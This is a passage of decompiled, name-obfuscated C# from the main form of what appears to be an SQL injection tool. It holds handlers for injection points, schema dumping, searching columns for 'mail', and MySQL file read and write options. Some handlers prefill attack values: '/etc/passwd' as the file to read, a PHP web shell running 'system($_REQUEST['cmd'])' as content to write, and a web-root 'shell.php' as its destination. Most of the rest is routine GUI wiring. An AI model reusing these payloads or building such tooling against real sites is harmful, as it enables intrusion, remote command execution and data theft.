			Globals.ShellUrl("http://www.alexa.com/siteinfo/" + Class23.smethod_11(txtURL.Text.Trim()));
		}
	}

	private void method_140(object sender, EventArgs e)
	{
		numFieldByField.Enabled = chkDumpFieldByField.Checked;
		numMaxRetryColumn.Enabled = chkDumpFieldByField.Checked;
	}

	private void method_141(object sender, EventArgs e)
	{
		txtAddHeaderName.Enabled = chkAddHearder.Checked;
		txtAddHeaderValue.Enabled = chkAddHearder.Checked;
	}

	private void method_142(object sender, EventArgs e)
	{
		if (cmbInjectionPoint.SelectedIndex == checked(cmbInjectionPoint.Items.Count - 1))
		{
			chkAddHearder.Checked = true;
			chkAddHearder.Enabled = false;
		}
		else
		{
			chkAddHearder.Enabled = true;
		}
	}

	private void method_143(object sender, EventArgs e)
	{
		method_76();
	}

	private void method_144(object sender, EventArgs e)
	{
		if (Operators.CompareString(mnuAutoScroll.Text, Globals.translate_0.GetStr(Globals.GMain, 63), TextCompare: false) == 0)
		{
			mnuAutoScroll.Text = Globals.translate_0.GetStr(Globals.GMain, 62);
		}
		else
		{
			mnuAutoScroll.Text = Globals.translate_0.GetStr(Globals.GMain, 63);
		}
	}

	private void method_145(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 134:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0026;
						case 5:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 4:
						case 6:
						case 7:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_000a:
					num = 2;
					if (decimal.Compare(numLimitMax.Value, 0m) <= 0)
					{
						break;
					}
					goto IL_0026;
					IL_0026:
					num = 3;
					numLimitX.Maximum = numLimitMax.Value;
					goto end_IL_0001_3;
					end_IL_0001_2:
					break;
				}
				num = 5;
				numLimitX.Maximum = 2147483647m;
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 134;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_146(object sender, EventArgs e)
	{
		method_78("AppInstencie.Schema");
		Globals.GMain.method_9(txtURL.Text, cmbSqlType.Text);
	}

	private void method_147(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(txtMySQLReadFilePath.Text))
		{
			txtMySQLReadFilePath.Text = "/etc/passwd";
		}
	}

	private void method_148(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(txtMySQLReadFilePath.Text))
		{
			txtMySQLReadFilePath.Text = "'<? system($_REQUEST['cmd']); ?>'";
		}
	}

	private void method_149(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(txtMySQLWriteFilePath.Text))
		{
			txtMySQLWriteFilePath.Text = "'/home/www/HostName_com/html/shell.php'";
		}
	}

	private void method_150(object sender, EventArgs e)
	{
	}

	private void method_151(object sender, TreeNodeMouseClickEventArgs e)
	{
		if (e.Button == MouseButtons.Right)
		{
			trwSchema.SelectedNode = e.Node;
		}
	}

	private void method_152(object sender, EventArgs e)
	{
		TextBox textBox = (TextBox)sender;
		textBox.Text = textBox.Text.Trim();
		textBox = null;
	}

	private void method_153(object sender, ToolStripItemClickedEventArgs e)
	{
	}

	private void method_154(object sender, MouseEventArgs e)
	{
	}

	private void method_155(object sender, EventArgs e)
	{
		numMySQLSplitRowsLenght.Enabled = chkMySQLSplitRows.Checked;
		numMySQLSplitRows.Enabled = chkMySQLSplitRows.Checked;
	}

	private void method_156(object sender, EventArgs e)
	{
		string_8 = txtSearchColumn.Text;
		method_0(Enum5.const_9);
	}

	private void method_157(object sender, EventArgs e)
	{
		if (txtSearchColumn.Text.Contains(" "))
		{
			txtSearchColumn.Text = txtSearchColumn.Text.Replace(" ", "");
		}
		if (string.IsNullOrEmpty(txtSearchColumn.Text))
		{
			txtSearchColumn.Text = "mail";
		}
		if (!txtSearchColumn.Items.Contains(txtSearchColumn.Text))
		{
			txtSearchColumn.Items.Add(txtSearchColumn.Text);
		}
	}

	private void method_158(object sender, EventArgs e)
	{
		btnSearchColumn.Enabled = !string.IsNullOrEmpty(txtSearchColumn.Text);
	}

	private void method_159(string string_9)
	{
		if (txtSearchColumnResult.InvokeRequired)
		{
			txtSearchColumnResult.Invoke(new Delegate20(method_159), string_9);
		}
		else
		{
			txtSearchColumnResult.AppendText(string_9 + "\r\n");
		}
	}

	[SpecialName]
	[DebuggerHidden]
	[CompilerGenerated]
	private void dumpLoading_0_OnPause(bool bool_6)
	{
		method_6(bool_6);
	}

	[SpecialName]
	[CompilerGenerated]
	[DebuggerHidden]
	private void method_160(object object_0)
	{
		method_24((Class47)object_0);
	}

	[SpecialName]
	[CompilerGenerated]
	[DebuggerHidden]
	private void method_161(object object_0)
	{
		method_22((Class47)object_0);
	}

	[SpecialName]
	[CompilerGenerated]
	[DebuggerHidden]
	private void method_162(object object_0)
	{
		method_23((Class47)object_0);
	}

	[SpecialName]
	[DebuggerHidden]
	[CompilerGenerated]
	private void method_163(object object_0)
	{
		method_24((Class47)object_0);
	}

	[SpecialName]
	[CompilerGenerated]
	[DebuggerHidden]
	private void method_164(object object_0)
	{
		method_25((Class47)object_0);
	}

	[SpecialName]
	[CompilerGenerated]
	[DebuggerHidden]
	private void method_165(object object_0)
	{
		method_21((Class47)object_0);
	}
}
